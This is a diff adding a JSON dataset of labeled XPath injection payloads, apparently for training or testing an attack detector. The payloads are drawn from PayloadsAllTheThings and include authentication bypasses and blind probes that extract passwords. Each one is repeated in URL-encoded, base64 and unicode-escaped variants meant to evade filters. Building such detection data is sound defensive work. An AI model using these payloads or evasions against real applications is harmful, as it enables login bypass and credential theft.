@@ -1,0 +1,1581 @@
+[
+  {
+    "id": "raw_xpath_00001__obf01",
+    "payload": "string%2528%252F%252Fuser%255Bname%252Ftext%2528%2529%253D%2527%2522%2520%252Bvuln_var1%252B%2520%2522%2527%2520and%2520password%252Ftext%2528%2529%253D%2527%2522%2520%252Bvuln_var1%252B%2520%2522%2527%255D%252Faccount%252Ftext%2528%2529%2529",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a1b8b517941a54ab0979bdfa64e6e794c64cce7110a737080db2cddf9a89b0f8",
+    "original_id": "raw_xpath_00001",
+    "original_payload": "string(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+    "obfuscated_payload": "string%2528%252F%252Fuser%255Bname%252Ftext%2528%2529%253D%2527%2522%2520%252Bvuln_var1%252B%2520%2522%2527%2520and%2520password%252Ftext%2528%2529%253D%2527%2522%2520%252Bvuln_var1%252B%2520%2522%2527%255D%252Faccount%252Ftext%2528%2529%2529",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 207667342,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00001__obf02",
+    "payload": "c3RyaW5nKC8vdXNlcltuYW1lL3RleHQoKT0nIiArdnVsbl92YXIxKyAiJyBhbmQgcGFzc3dvcmQvdGV4dCgpPSciICt2dWxuX3ZhcjErICInXS9hY2NvdW50L3RleHQoKSk",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a1b8b517941a54ab0979bdfa64e6e794c64cce7110a737080db2cddf9a89b0f8",
+    "original_id": "raw_xpath_00001",
+    "original_payload": "string(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+    "obfuscated_payload": "c3RyaW5nKC8vdXNlcltuYW1lL3RleHQoKT0nIiArdnVsbl92YXIxKyAiJyBhbmQgcGFzc3dvcmQvdGV4dCgpPSciICt2dWxuX3ZhcjErICInXS9hY2NvdW50L3RleHQoKSk",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 207668351,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00001__obf03",
+    "payload": "string\\u0028\\u002f/user[name\\u002ftext\\u0028\\u0029=\\u0027\"%09+vuln_var1+%09\"'\tand%09password\\u002ftext()='\\u0022\t+vuln_var1+\t\\u0022\\u0027\\u005d\\u002faccount/text\\u0028))",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a1b8b517941a54ab0979bdfa64e6e794c64cce7110a737080db2cddf9a89b0f8",
+    "original_id": "raw_xpath_00001",
+    "original_payload": "string(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+    "obfuscated_payload": "string\\u0028\\u002f/user[name\\u002ftext\\u0028\\u0029=\\u0027\"%09+vuln_var1+%09\"'\tand%09password\\u002ftext()='\\u0022\t+vuln_var1+\t\\u0022\\u0027\\u005d\\u002faccount/text\\u0028))",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 207669360,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00001__obf04",
+    "payload": "string%2528%252F%252Fuser%255Bname%252Ftext%2528%2529%253D%2527%2522%2509%252Bvuln_var1%252B%2509%2522%2527%252509and%2509password%252Ftext%2528%2529%253D%2527%2522%25250a%252Bvuln_var1%252B%2509%2522%2527%255D%252Faccount%252Ftext%2528%2529%2529",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a1b8b517941a54ab0979bdfa64e6e794c64cce7110a737080db2cddf9a89b0f8",
+    "original_id": "raw_xpath_00001",
+    "original_payload": "string(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+    "obfuscated_payload": "string%2528%252F%252Fuser%255Bname%252Ftext%2528%2529%253D%2527%2522%2509%252Bvuln_var1%252B%2509%2522%2527%252509and%2509password%252Ftext%2528%2529%253D%2527%2522%25250a%252Bvuln_var1%252B%2509%2522%2527%255D%252Faccount%252Ftext%2528%2529%2529",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 207670369,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00002__obf01",
+    "payload": "' %6Fr '1'='1\n' or ''='\nx' o%72 1=1 o%72 'x'='%79\n/\n//\n//*\n*/*\n@*\n%63ount(/child::n%6Fde())\nx' or name()='%75serna%6De' %6Fr 'x'='y\n' and cou%6Et(/*)=%31 an%64 '1'='1\n' and count(/@*)=1 and '1'='1\n' and %63oun%74(/comment())=1 and '%31'='1\n')] | //use%72/*[cont%61ins(*,'\n') %61%6Ed %63%6Fnt%61in%73(.%2E/p%61ss%77%6Frd,'c\n') and s%74ar%74s-with(%2E./password,'c",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "6dbc08fa0494b21dd8fdbe8d5a275ee6d243d58105f39bcf2255d6c3dec9edca",
+    "original_id": "raw_xpath_00002",
+    "original_payload": "' or '1'='1\n' or ''='\nx' or 1=1 or 'x'='y\n/\n//\n//*\n*/*\n@*\ncount(/child::node())\nx' or name()='username' or 'x'='y\n' and count(/*)=1 and '1'='1\n' and count(/@*)=1 and '1'='1\n' and count(/comment())=1 and '1'='1\n')] | //user/*[contains(*,'\n') and contains(../password,'c\n') and starts-with(../password,'c",
+    "obfuscated_payload": "' %6Fr '1'='1\n' or ''='\nx' o%72 1=1 o%72 'x'='%79\n/\n//\n//*\n*/*\n@*\n%63ount(/child::n%6Fde())\nx' or name()='%75serna%6De' %6Fr 'x'='y\n' and cou%6Et(/*)=%31 an%64 '1'='1\n' and count(/@*)=1 and '1'='1\n' and %63oun%74(/comment())=1 and '%31'='1\n')] | //use%72/*[cont%61ins(*,'\n') %61%6Ed %63%6Fnt%61in%73(.%2E/p%61ss%77%6Frd,'c\n') and s%74ar%74s-with(%2E./password,'c",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 207767345,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00002__obf02",
+    "payload": "JyBvciAnMSc9JzEKJyBvciAnJz0nCngnIG9yIDE9MSBvciAneCc9J3kKLwovLwovLyoKKi8qCkAqCmNvdW50KC9jaGlsZDo6bm9kZSgpKQp4JyBvciBuYW1lKCk9J3VzZXJuYW1lJyBvciAneCc9J3kKJyBhbmQgY291bnQoLyopPTEgYW5kICcxJz0nMQonIGFuZCBjb3VudCgvQCopPTEgYW5kICcxJz0nMQonIGFuZCBjb3VudCgvY29tbWVudCgpKT0xIGFuZCAnMSc9JzEKJyldIHwgLy91c2VyLypbY29udGFpbnMoKiwnCicpIGFuZCBjb250YWlucyguLi9wYXNzd29yZCwnYwonKSBhbmQgc3RhcnRzLXdpdGgoLi4vcGFzc3dvcmQsJ2M",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "6dbc08fa0494b21dd8fdbe8d5a275ee6d243d58105f39bcf2255d6c3dec9edca",
+    "original_id": "raw_xpath_00002",
+    "original_payload": "' or '1'='1\n' or ''='\nx' or 1=1 or 'x'='y\n/\n//\n//*\n*/*\n@*\ncount(/child::node())\nx' or name()='username' or 'x'='y\n' and count(/*)=1 and '1'='1\n' and count(/@*)=1 and '1'='1\n' and count(/comment())=1 and '1'='1\n')] | //user/*[contains(*,'\n') and contains(../password,'c\n') and starts-with(../password,'c",
+    "obfuscated_payload": "JyBvciAnMSc9JzEKJyBvciAnJz0nCngnIG9yIDE9MSBvciAneCc9J3kKLwovLwovLyoKKi8qCkAqCmNvdW50KC9jaGlsZDo6bm9kZSgpKQp4JyBvciBuYW1lKCk9J3VzZXJuYW1lJyBvciAneCc9J3kKJyBhbmQgY291bnQoLyopPTEgYW5kICcxJz0nMQonIGFuZCBjb3VudCgvQCopPTEgYW5kICcxJz0nMQonIGFuZCBjb3VudCgvY29tbWVudCgpKT0xIGFuZCAnMSc9JzEKJyldIHwgLy91c2VyLypbY29udGFpbnMoKiwnCicpIGFuZCBjb250YWlucyguLi9wYXNzd29yZCwnYwonKSBhbmQgc3RhcnRzLXdpdGgoLi4vcGFzc3dvcmQsJ2M",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 207768354,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00002__obf03",
+    "payload": "'%0aor%09'1\\u0027='1\n\\u0027\tor%09\\u0027\\u0027\\u003d\\u0027\nx\\u0027\tor%0a1\\u003d1\tor%09\\u0027x\\u0027\\u003d\\u0027y\n\\u002f\n//\n/\\u002f*\n*\\u002f*\n@*\ncount(\\u002fchild\\u003a:node\\u0028\\u0029\\u0029\nx'%0aor\tname\\u0028\\u0029\\u003d'username'\tor%0a\\u0027x\\u0027='y\n'\tand%09count\\u0028\\u002f*)\\u003d1%09and\t\\u00271\\u0027=\\u00271\n\\u0027%0aand\tcount\\u0028/@*)\\u003d1%09and%0a\\u00271\\u0027\\u003d'1\n\\u0027\tand\tcount(/comment())\\u003d1%0aand\t'1\\u0027\\u003d\\u00271\n\\u0027\\u0029\\u005d\t|%0a/\\u002fuser\\u002f*[contains(*,'\n\\u0027)%0aand%09contains\\u0028../password,\\u0027c\n\\u0027\\u0029\tand\tstarts-with(../password,'c",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "6dbc08fa0494b21dd8fdbe8d5a275ee6d243d58105f39bcf2255d6c3dec9edca",
+    "original_id": "raw_xpath_00002",
+    "original_payload": "' or '1'='1\n' or ''='\nx' or 1=1 or 'x'='y\n/\n//\n//*\n*/*\n@*\ncount(/child::node())\nx' or name()='username' or 'x'='y\n' and count(/*)=1 and '1'='1\n' and count(/@*)=1 and '1'='1\n' and count(/comment())=1 and '1'='1\n')] | //user/*[contains(*,'\n') and contains(../password,'c\n') and starts-with(../password,'c",
+    "obfuscated_payload": "'%0aor%09'1\\u0027='1\n\\u0027\tor%09\\u0027\\u0027\\u003d\\u0027\nx\\u0027\tor%0a1\\u003d1\tor%09\\u0027x\\u0027\\u003d\\u0027y\n\\u002f\n//\n/\\u002f*\n*\\u002f*\n@*\ncount(\\u002fchild\\u003a:node\\u0028\\u0029\\u0029\nx'%0aor\tname\\u0028\\u0029\\u003d'username'\tor%0a\\u0027x\\u0027='y\n'\tand%09count\\u0028\\u002f*)\\u003d1%09and\t\\u00271\\u0027=\\u00271\n\\u0027%0aand\tcount\\u0028/@*)\\u003d1%09and%0a\\u00271\\u0027\\u003d'1\n\\u0027\tand\tcount(/comment())\\u003d1%0aand\t'1\\u0027\\u003d\\u00271\n\\u0027\\u0029\\u005d\t|%0a/\\u002fuser\\u002f*[contains(*,'\n\\u0027)%0aand%09contains\\u0028../password,\\u0027c\n\\u0027\\u0029\tand\tstarts-with(../password,'c",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "xpath_space_variant"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 207769363,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00002__obf04",
+    "payload": "%2527%252509or%252509%25271%2527%253D%25271%250A%2527%25250aor%25250a%2527%2527%253D%2527%250Ax%2527%25250aor%25091%253D1%2509or%252509%2527x%2527%253D%2527y%250A%252F%250A%252F%252F%250A%252F%252F%252A%250A%252A%252F%252A%250A%2540%252A%250Acount%2528%252Fchild%253A%253Anode%2528%2529%2529%250Ax%2527%25250aor%2509name%2528%2529%253D%2527username%2527%252509or%2509%2527x%2527%253D%2527y%250A%2527%252509and%25250acount%2528%252F%252A%2529%253D1%25250aand%252509%25271%2527%253D%25271%250A%2527%2509and%2509count%2528%252F%2540%252A%2529%253D1%252509and%25250a%25271%2527%253D%25271%250A%2527%252509and%25250acount%2528%252Fcomment%2528%2529%2529%253D1%25250aand%2509%25271%2527%253D%25271%250A%2527%2529%255D%2509%257C%2509%252F%252Fuser%252F%252A%255Bcontains%2528%252A%252C%2527%250A%2527%2529%252509and%2509contains%2528..%252Fpassword%252C%2527c%250A%2527%2529%2509and%25250astarts-with%2528..%252Fpassword%252C%2527c",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "6dbc08fa0494b21dd8fdbe8d5a275ee6d243d58105f39bcf2255d6c3dec9edca",
+    "original_id": "raw_xpath_00002",
+    "original_payload": "' or '1'='1\n' or ''='\nx' or 1=1 or 'x'='y\n/\n//\n//*\n*/*\n@*\ncount(/child::node())\nx' or name()='username' or 'x'='y\n' and count(/*)=1 and '1'='1\n' and count(/@*)=1 and '1'='1\n' and count(/comment())=1 and '1'='1\n')] | //user/*[contains(*,'\n') and contains(../password,'c\n') and starts-with(../password,'c",
+    "obfuscated_payload": "%2527%252509or%252509%25271%2527%253D%25271%250A%2527%25250aor%25250a%2527%2527%253D%2527%250Ax%2527%25250aor%25091%253D1%2509or%252509%2527x%2527%253D%2527y%250A%252F%250A%252F%252F%250A%252F%252F%252A%250A%252A%252F%252A%250A%2540%252A%250Acount%2528%252Fchild%253A%253Anode%2528%2529%2529%250Ax%2527%25250aor%2509name%2528%2529%253D%2527username%2527%252509or%2509%2527x%2527%253D%2527y%250A%2527%252509and%25250acount%2528%252F%252A%2529%253D1%25250aand%252509%25271%2527%253D%25271%250A%2527%2509and%2509count%2528%252F%2540%252A%2529%253D1%252509and%25250a%25271%2527%253D%25271%250A%2527%252509and%25250acount%2528%252Fcomment%2528%2529%2529%253D1%25250aand%2509%25271%2527%253D%25271%250A%2527%2529%255D%2509%257C%2509%252F%252Fuser%252F%252A%255Bcontains%2528%252A%252C%2527%250A%2527%2529%252509and%2509contains%2528..%252Fpassword%252C%2527c%250A%2527%2529%2509and%25250astarts-with%2528..%252Fpassword%252C%2527c",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 207770372,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00003__obf01",
+    "payload": "%27%20or %271%27%3D%271",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "39a043f5f5b6d2564dbf55bf07470dc30a3da1a7cd322f26ed612efcd68da2b1",
+    "original_id": "raw_xpath_00003",
+    "original_payload": "' or '1'='1",
+    "obfuscated_payload": "%27%20or %271%27%3D%271",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 207867348,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00003__obf02",
+    "payload": "JyBvciAnMSc9JzE=",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "39a043f5f5b6d2564dbf55bf07470dc30a3da1a7cd322f26ed612efcd68da2b1",
+    "original_id": "raw_xpath_00003",
+    "original_payload": "' or '1'='1",
+    "obfuscated_payload": "JyBvciAnMSc9JzE=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 207868357,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00003__obf03",
+    "payload": "'%0aor%09\\u00271'='1",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "39a043f5f5b6d2564dbf55bf07470dc30a3da1a7cd322f26ed612efcd68da2b1",
+    "original_id": "raw_xpath_00003",
+    "original_payload": "' or '1'='1",
+    "obfuscated_payload": "'%0aor%09\\u00271'='1",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 207869366,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00003__obf04",
+    "payload": "%2527%252509or%252509%25271%2527%253D%25271",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "39a043f5f5b6d2564dbf55bf07470dc30a3da1a7cd322f26ed612efcd68da2b1",
+    "original_id": "raw_xpath_00003",
+    "original_payload": "' or '1'='1",
+    "obfuscated_payload": "%2527%252509or%252509%25271%2527%253D%25271",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 207870375,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00004__obf01",
+    "payload": "'%20or%20%27%27=%27",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "96ef974ed4e8e75b0b0051bf0c54f99ca0bb8e380cb83ee37b0a27ffa0b077e4",
+    "original_id": "raw_xpath_00004",
+    "original_payload": "' or ''='",
+    "obfuscated_payload": "'%20or%20%27%27=%27",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 207967351,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00004__obf02",
+    "payload": "JyBvciAnJz0n",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "96ef974ed4e8e75b0b0051bf0c54f99ca0bb8e380cb83ee37b0a27ffa0b077e4",
+    "original_id": "raw_xpath_00004",
+    "original_payload": "' or ''='",
+    "obfuscated_payload": "JyBvciAnJz0n",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 207968360,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00004__obf03",
+    "payload": "'\tor%0a\\u0027\\u0027\\u003d'",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "96ef974ed4e8e75b0b0051bf0c54f99ca0bb8e380cb83ee37b0a27ffa0b077e4",
+    "original_id": "raw_xpath_00004",
+    "original_payload": "' or ''='",
+    "obfuscated_payload": "'\tor%0a\\u0027\\u0027\\u003d'",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "xpath_space_variant"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 207969369,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00004__obf04",
+    "payload": "%27%0aor%250a%27%27='",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "96ef974ed4e8e75b0b0051bf0c54f99ca0bb8e380cb83ee37b0a27ffa0b077e4",
+    "original_id": "raw_xpath_00004",
+    "original_payload": "' or ''='",
+    "obfuscated_payload": "%27%0aor%250a%27%27='",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 207970378,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00005__obf01",
+    "payload": "x%27%20or%201%3D1%20or%20%27x%27=%27y",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c94d0e8e203d04de4d1d8a57b4a1b872098f00bde458b01f46ea71bdd21a658d",
+    "original_id": "raw_xpath_00005",
+    "original_payload": "x' or 1=1 or 'x'='y",
+    "obfuscated_payload": "x%27%20or%201%3D1%20or%20%27x%27=%27y",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208067354,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00005__obf02",
+    "payload": "eCcgb3IgMT0xIG9yICd4Jz0neQ==",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c94d0e8e203d04de4d1d8a57b4a1b872098f00bde458b01f46ea71bdd21a658d",
+    "original_id": "raw_xpath_00005",
+    "original_payload": "x' or 1=1 or 'x'='y",
+    "obfuscated_payload": "eCcgb3IgMT0xIG9yICd4Jz0neQ==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 208068363,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00005__obf03",
+    "payload": "x'%09or%091=1%09or%0a\\u0027x'=\\u0027y",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c94d0e8e203d04de4d1d8a57b4a1b872098f00bde458b01f46ea71bdd21a658d",
+    "original_id": "raw_xpath_00005",
+    "original_payload": "x' or 1=1 or 'x'='y",
+    "obfuscated_payload": "x'%09or%091=1%09or%0a\\u0027x'=\\u0027y",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "xpath_space_variant"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 208069372,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00005__obf04",
+    "payload": "eCclMDlvcgkxPTElMGFvciUwYSd4Jz0neQ==",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
